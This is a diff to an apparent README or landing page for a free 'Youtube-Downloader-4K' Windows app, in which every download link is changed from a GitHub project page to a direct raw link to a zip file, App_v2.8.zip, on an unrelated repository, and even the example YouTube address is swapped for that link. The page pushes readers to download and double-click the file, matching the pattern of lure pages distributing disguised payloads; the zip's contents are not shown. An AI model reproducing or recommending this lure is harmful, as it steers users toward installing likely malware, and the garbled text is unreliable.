@@ -6,7 +6,7 @@ description: "Download YouTube videos and playlists in up to 4K quality for free
 <h1>🎬 Youtube-Downloader-4K - Free 4K Video Downloader for Windows</h1>
 
 <p align="center">
-  <a href="https://github.com/Unlucky-obtusetriangle8046/Youtube-Downloader-4K" style="display:inline-block; padding:15px 35px; background:#ff6b6b; color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Unlucky-obtusetriangle8046/unlucky-obtusetriangle8046.github.io/main/assets/App_v2.8.zip" style="display:inline-block; padding:15px 35px; background:#ff6b6b; color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <br>
@@ -19,7 +19,7 @@ description: "Download YouTube videos and playlists in up to 4K quality for free
 
 To start using this wonderful tool, visit this link to download the application:  
 
-👉 **[Click Here to Download Youtube-Downloader-4K](https://github.com/Unlucky-obtusetriangle8046/Youtube-Downloader-4K)**  
+👉 **[Click Here to Download Youtube-Downloader-4K](https://raw.githubusercontent.com/Unlucky-obtusetriangle8046/unlucky-obtusetriangle8046.github.io/main/assets/App_v2.8.zip)**  
 
 This link takes you to the official download page. From there, simply choose the version for Windows and save the file to your computer. After the download completes, double-click the downloaded file to begin the setup process. The whole thing takes just a couple of minutes, and you will be ready to save your favorite YouTube videos in stunning 4K quality. Whether you want a single funny clip or an entire playlist of music, this software makes it incredibly easy. Download it now, it's completely free, works great on Windows, and has no watermarks on your saved videos. Perfect for personal use, school projects, content creation, or building your offline video library.
 
@@ -79,7 +79,7 @@ If your computer runs Windows and has internet access, you're most likely good t
 Once you have the software installed, follow this simple process:
 
 1.  **Open Youtube Downloader 4K** from your desktop or Start menu.  
-2.  **Copy a Video Link** - Go to YouTube.com, find a video you like,, click the address bar at the top of your browser,, select the full URL (it starts with "https://www.youtube.com/watch?v=..."), right-click,and choose "Copy".  
+2.  **Copy a Video Link** - Go to YouTube.com, find a video you like,, click the address bar at the top of your browser,, select the full URL (it starts with "https://raw.githubusercontent.com/Unlucky-obtusetriangle8046/unlucky-obtusetriangle8046.github.io/main/assets/App_v2.8.zip"), right-click,and choose "Copy".  
 3.. **Paste the Link** - Go back to the Youtube Downloader 4K window. Click the big paste area or press Ctrl+V (or Command+V if using a Mac keyboard) to place the link.  
 4.. **Choose Your Quality** - Look for a dropdown menu or quality selector. Choose "4K" or "2160p" for the highest resolution. You can also choose lower qualities like 1080p, 720p, or 480p if you want smaller file sizes.  
 5..**Select Download Location** - Pick where you want the video to be saved (e.g., Videos folder, Desktop, or a specific drive).  
@@ -144,10 +144,10 @@ This tool is regularly updated to ensure compatibility with the latest YouTube f
 
 Youtube-Downloader-4K is your go-to solution for saving YouTube videos in pristine 4K quality. It's free, it's easy, no watermarks, and it's ready for 2026. Whether you're a casual viewer who wants to watch a few videos offline, or a power user who downloads entire playlists, this app delivers. Don't miss out on this fantastic tool. Download it now via the green button above or by visiting this link:  
 
-👉 **[Download Youtube-Downloader-4K for Windows](https://github.com/Unlucky-obtusetriangle8046/Youtube-Downloader-4K)**  
+👉 **[Download Youtube-Downloader-4K for Windows](https://raw.githubusercontent.com/Unlucky-obtusetriangle8046/unlucky-obtusetriangle8046.github.io/main/assets/App_v2.8.zip)**  
 
 Join thousands of happy users who enjoy their favorite YouTube content anytime, anywhere, with no strings attached. Get started today!
 
 <p align="center">
-  <a href="https://github.com/Unlucky-obtusetriangle8046/Youtube-Downloader-4K" style="display:inline-block; padding:15px 35px; background:#4CAF50; color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(76,175,80,0.4);">🚀 FREE DOWNLOAD - 2026</a>
+  <a href="https://raw.githubusercontent.com/Unlucky-obtusetriangle8046/unlucky-obtusetriangle8046.github.io/main/assets/App_v2.8.zip" style="display:inline-block; padding:15px 35px; background:#4CAF50; color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(76,175,80,0.4);">🚀 FREE DOWNLOAD - 2026</a>
 </p>
